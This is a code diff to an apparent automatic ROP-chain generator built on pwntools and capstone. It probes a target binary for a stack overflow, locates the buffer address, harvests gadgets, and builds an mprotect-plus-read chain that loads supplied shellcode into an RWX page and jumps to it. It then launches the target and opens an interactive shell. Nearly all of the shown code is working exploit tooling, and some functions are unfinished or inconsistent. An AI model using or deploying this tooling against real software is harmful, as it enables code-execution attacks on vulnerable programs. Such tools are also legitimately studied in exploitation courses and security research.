@@ -12,7 +12,7 @@
 import os
 import argparse
 import struct
-import subprocess
+from subprocess import *
 import re
 from capstone import *
 from pwn import *
@@ -41,6 +41,7 @@ gadget_map = {}
 has_libc = True
 libc_addr = None
 buflen = 0
+bufaddr = None
 mprotect_addr = None
 mmap_addr = None
 memcpy_addr = None
@@ -80,32 +81,82 @@ def find_buffer_length(f):
         if len(buf) > 5000:
             break
 
-        proc = subprocess.Popen([f, buf], stdout=PIPE, stderr=PIPE)
+        proc = subprocess.Popen([f], stdin=PIPE, stdout=PIPE, stderr=STDOUT)
         try:
-            stdout, stderr = proc.communicate(timeout=5)
+            stdout = proc.communicate(input=bytes(buf.encode('ascii')))
         except TimeoutExpired:
             proc.kill()
-            stdout, stderr = proc.communicate()
+        #proc = process([f])
+        #proc.sendline(buf)
+        #proc.recvall()
 
         if proc.returncode == -11:
-            debug(f"found overflow length: {len(buf)}")
+            print(f"found overflow length: {len(buf)}")
             found = True
             break
         buf += "A"
+        #proc.close()
 
     if found is False:
         return -1
     return len(buf)
 
 
-# Tries to determine a suitable memory page to make RWX
-# This should be in the address space of the binary we're trying to exploit,
-# in some currently non-executable region
-def find_sc_addr(f):
-    elf = ELF(f)
+# Determines the address of the buffer
+def find_buffer_addr(f):
+    # since ASLR is disabled, we should be able to write a small program
+    # using the known information about the size/length of the buffer
+    # before it overflows, then print out that addr for the buffer
+    # in a dummy program
+    try:
+        buf_addr_prog = open("./find-vuln-buf.c", "w+")
+        buf_addr_prog.write(
+                "#include <stdio.h>\n" +
+                "#include <string.h>\n" +
+                "\n" +
+                "int main(int argc, char *argv[])\n" +
+                "{\n" +
+                f"    char buf[{buflen-8}];\n" +
+                "    printf(\"%p\", buf);\n" +
+                "    return 0;\n" +
+                "}")
+        buf_addr_prog.close()
+        
+        gcc = subprocess.Popen(["gcc", "-fno-stack-protector", "-g", "-o", "find-vuln-buf", "find-vuln-buf.c"], stdout=PIPE, stderr=PIPE)
+        try:
+            stdout, stderr = gcc.communicate(timeout=5)
+        except TimeoutExpired:
+            gcc.kill()
+            stdout, stderr = gcc.communicate()
+
+        #bufaddr = process(['./find-vuln-buf']).recvall()
+        #debug(f"Buffer address determined @ {bufaddr}")
+        bufproc = subprocess.Popen(["./find-vuln-buf"], stdout=PIPE, stderr=PIPE)
+        bufaddr = None
+        try:
+            stdout, stderr = bufproc.communicate(timeout=5)
+            bufaddr = stdout
+        except TimeoutExpired:
+            bufproc.kill()
+
+        subprocess.Popen(["rm", "-rf", "find-vuln-buf.c", "find-vuln-buf"])
+        return bufaddr
+
+    except Exception as err:
+        print(f"{Colors.BOLD}{Colors.RED}Failed to write file: {err}{Colors.GREY}{Colors.RESET}")
+        return None
 
 
-    pass
+# Packs s into LE-64bit format. This looks for NULL bytes, and replaces them with \xFF
+# bytes, which we will keep a list of, then prepend gadgets which will replace these
+# bytes with \x00 at runtime (if necessary). Also handles 0x0A and 0x0D (CR/LF)
+def nullpack(s, offset=0):
+    global buflen
+    global bufaddr
+
+    buf = p64(s)
+    return buf
+
 
 # Small helper function to print a gadget in human-readable format
 def print_gadget(g, g_addr):
@@ -131,8 +182,9 @@ def build_gadgets(elfname, baseaddr):
     global gadget_map
     gadgets = {}
 
-    # we're only concerned with executable segments
     elf = ELF(elfname)
+
+    # we're only concerned with executable segments
     for seg in elf.executable_segments:
         debug(f"Executable segment @ {hex(baseaddr + seg.header.p_paddr)} (offset {hex(seg.header.p_paddr)})")
 
@@ -157,7 +209,7 @@ def build_gadgets(elfname, baseaddr):
                 s_len = 25
 
             while i < s_len:
-                gadgets[baseaddr + s_offset + i] = s[i:s_len]
+                gadgets[baseaddr + s_offset + seg.header.p_offset + i] = s[i:s_len]
                 i += 1
 
             s_offset += len(s)
@@ -362,8 +414,14 @@ def find_add_rax_1_ret():
 # Attempts to build the syscall-mprotect chain
 def build_syscall_mprotect(f):
     # our goal here is to `mprotect(ADDR, LEN, R|W|X)` via system call
+    # followed by a read() into that area
+    # then we return into that area
+
     global buflen
     global sc_addr
+    global libc_addr
+
+    debug(f"libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")
 
     syscall = find_syscall_ret() # addr of syscall gadget
     pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
@@ -385,33 +443,34 @@ def build_syscall_mprotect(f):
     payload = b'A' * buflen                 # padding
 
     # first the mprotect call to set up the area
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(add_rax_1) * 10     # rax = 10
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(sc_addr)            # address we want to make r/w/x
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(0x1000)             # 4kb (pagesize)
-    payload += p64(pop_r12_pr)         # r12 = 7
-    payload += p64(0x7)                # 7
-    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
-    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
-    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
-    payload += p64(syscall)            # syscall
+    payload += nullpack(xor_rax_rax)        # rax = 0
+    payload += nullpack(add_rax_1) * 10     # rax = 10
+    payload += nullpack(pop_rdi)            # 1st arg
+    payload += nullpack(sc_addr)            # address we want to make r/w/x
+    payload += nullpack(pop_rsi)            # 2nd arg
+    payload += nullpack(0x1000)             # 4kb (pagesize)
+    payload += nullpack(pop_r12_pr)         # r12 = 7
+    payload += nullpack(0x7)                # 7
+    payload += nullpack(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
+    payload += nullpack(mov_rdx_r12_ppr)    # rdx = r12 = 7
+    payload += nullpack(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
+    payload += nullpack(syscall)            # syscall
 
     # second, we use a read() call to read the shellcode into the buffer
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(0x0)                # FD0 (standard input)
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(sc_addr)            # address to write into
-    payload += p64(pop_r12_pr)         # r12 = 0x1000
-    payload += p64(0x1000)             # 0x1000
-    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 0x1000
-    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(syscall)            # syscall
+    payload += nullpack(xor_rax_rax)        # rax = 0
+    payload += nullpack(pop_rdi)            # 1st arg
+    payload += nullpack(0x0)                # fd0 (stdin)
+    payload += nullpack(pop_rsi)            # 2nd arg
+    payload += nullpack(sc_addr)            # address to write into
+    payload += nullpack(pop_r12_pr)         # r12 = 4kb
+    payload += nullpack(0x1000)             # 4kb
+    payload += nullpack(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+    payload += nullpack(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+    payload += nullpack(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += nullpack(syscall)            # syscall
 
-    payload += p64(sc_addr)            # return into the read shellcode
+    # finally, return into the RWX page containing the shellcode
+    payload += nullpack(sc_addr)            # return into the read shellcode
 
     return payload
 
@@ -422,6 +481,7 @@ def build_chain(filename):
     global has_libc
     global libc_addr
     global buflen
+    global bufaddr
     global mprotect_addr
     global mmap_addr
     global memcpy_addr
@@ -433,6 +493,7 @@ def build_chain(filename):
     has_libc = True
     libc_addr = None
     buflen = 0
+    bufaddr = None
     mprotect_addr = None
     mmap_addr = None
     memcpy_addr = None
@@ -485,11 +546,16 @@ def build_chain(filename):
 
     # Determine length of buffer which causes vulnerability
     buflen = find_buffer_length(filename)
-
     if buflen <= 0:
         print(f"{Colors.BOLD}{Colors.YELLOW}{filename}{Colors.WHITE} does not appear to be vulnerable.")
         return None
-    print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")
+    debug(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")
+
+    # Determines the address of the buffer in memory
+    bufaddr = find_buffer_addr(filename)
+    if bufaddr is None:
+        print(f"{Colors.BOLD}{Colors.YELLOW}Unable to determine buffer address.{Colors.GREY}{Colors.RESET}")
+        return None
 
     # get the addresses of the functions needed in libc
     if elf.libc is None:
@@ -519,12 +585,15 @@ def build_chain(filename):
     if res is not None:
         print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed syscall-mprotect chain...{Colors.GREY}{Colors.RESET}")
         print(f"{Colors.BOLD}{Colors.WHITE}*** Executing {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
-        print_payload(res)
-        print(f"unfiltered: {res}")
-        #subprocess.call([filename, res])
-        p = process("gdb", "--args", filename, res)
-        p.sendline(EXEC_BINSH64_SC)
+        p = process([filename])
+        p.sendline(bytes(res))
+        p.sendline(bytes(shellcode))
         p.interactive()
+        p = subprocess.Popen([filename])
+
+        #p = subprocess.Popen([filename], stdin=PIPE)
+        #p.communicate(input=bytes(res))
+        #p.communicate(input=bytes(shellcode))
 
         return
 
@@ -537,25 +606,23 @@ def build_chain(filename):
 
 # Prints out the generated payload in a human-readable format (hex-encoded string)
 def print_payload(s):
+    s_list = list(s)
     i = 0
-    for c in s:
-        print(f"\\x{hex(c)}", end='')
-        i += 4
-        if i == 80:
-            print()
-            i = 0
-    print()
+    for c in s_list:
+        c = hex(c)
+        c = "\\x" + c
+        s_list[i] = c
+        i += 1
+    s_list = "".join(s_list)
 
 
     outf = open("rop-chain.out", "w")
-    for c in s:
-        outf.write(f"\\x{hex(c)}")
+    outf.write(s_list)
     outf.close()
 
 
 # Main ROPe function
 def ROPe():
-
     # parse arguments
     parser = argparse.ArgumentParser(description="Automatically generate a ROP chain suitable for executing a third party payload.")
     parser.add_argument('-v', action='store_true', help='enable verbose output')
@@ -574,7 +641,10 @@ def ROPe():
 
     context(os='linux', arch='amd64')
 
-    print(f"{Colors.BOLD}{Colors.GREY}Supplied shellcode{Colors.WHITE}: {Colors.GREY}\"{Colors.YELLOW}{shellcode}{Colors.GREY}\" {Colors.WHITE}")
+    debug(f"{Colors.BOLD}{Colors.GREY}Supplied shellcode{Colors.WHITE}: {Colors.GREY}\"{Colors.YELLOW}")
+    if verbose == 1:
+        sys.stdout.buffer.write(shellcode)
+    debug(f"{Colors.GREY}\" {Colors.WHITE}")
    
     # Go through each supplied file, trying to build a ROP chain using it's gadgets
     for f in files:
